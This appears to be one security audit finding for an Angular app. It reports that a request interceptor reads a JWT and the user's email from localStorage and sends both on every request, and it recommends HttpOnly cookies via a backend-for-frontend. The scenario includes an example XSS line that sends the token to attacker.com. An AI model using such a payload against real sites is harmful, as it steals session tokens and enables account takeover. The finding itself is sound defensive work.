  title: JWT session token stored in localStorage accessible — request.interceptor.ts:13
  affected_parameter: token
  scenario: 'The `RequestInterceptor` reads the JWT from `localStorage.getItem(''token'')` at line 13 and attaches it as `Authorization:
    Bearer <token>` on every HTTP request. localStorage is accessible to any same-origin JavaScript, including XSS payloads.
    In conjunction with the multiple bypassSecurityTrustHtml calls in search-result.component.ts, about.component.ts, and
    last-login-ip.component.ts, a successful XSS attack can immediately exfiltrate the JWT with `fetch(''https://attacker.com/?t=''+localStorage.getItem(''token''))`.
    The interceptor also reads `localStorage.getItem(''email'')` at line 20 and sends it as `X-User-Email`, adding another
    PII item to every request.'
  evidence_summary: '`RequestInterceptor.intercept()` at line 13 reads JWT from `localStorage` and appends it to every outbound
    API request; localStorage is XSS-readable on the same origin.'
  impact_description: Single XSS payload exfiltrates the JWT and email from localStorage, enabling persistent account takeover
    until token expiry.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: None — no HttpOnly cookie alternative; no CSP restricting script-src.
  mitigation_title: Migrate JWT storage from localStorage to HttpOnly Secure SameSite=Strict cookies via a Backend-for-Frontend
    pattern
  remediation:
    effort: High
    steps:
    - Implement a Backend-for-Frontend (BFF) session endpoint that issues an HttpOnly Secure SameSite=Strict session cookie
      after login, eliminating the need for JavaScript to read or transmit the token.
    - Remove `localStorage.setItem('token', ...)` calls across `oauth.component.ts:51` and all other login flows.
    - 'Update the `RequestInterceptor` to rely on the browser''s automatic cookie sending (`withCredentials: true`) rather
      than manually reading localStorage.'
    - Remove the `X-User-Email` header from interceptor; derive user identity server-side from the validated session.
    code_example: null
    reference: CWE-922
